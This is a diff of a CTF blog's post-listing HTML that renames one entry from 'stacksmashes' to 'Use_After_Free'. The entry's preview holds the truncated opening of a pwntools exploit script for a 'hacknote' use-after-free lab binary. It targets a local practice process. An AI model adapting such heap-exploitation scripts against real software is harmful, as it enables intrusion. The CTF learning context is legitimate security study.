@@ -257,7 +257,7 @@ void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>stacksmashes
+    <h2>Use_After_Free
     </h2>
   </header>
   <div class="entry-content">
@@ -287,7 +287,7 @@ void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (
 #!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x08048986p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;aaaa&#39;)p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;bbbb&#39;)p.recvuntil(&#39;Your choice :&#39;)p....</p>
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to stacksmashes" href="https://jellyfish-pro.github.io/ctf/use_after_free/"></a>
+  <a class="entry-link" aria-label="post link to Use_After_Free" href="https://jellyfish-pro.github.io/ctf/use_after_free/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
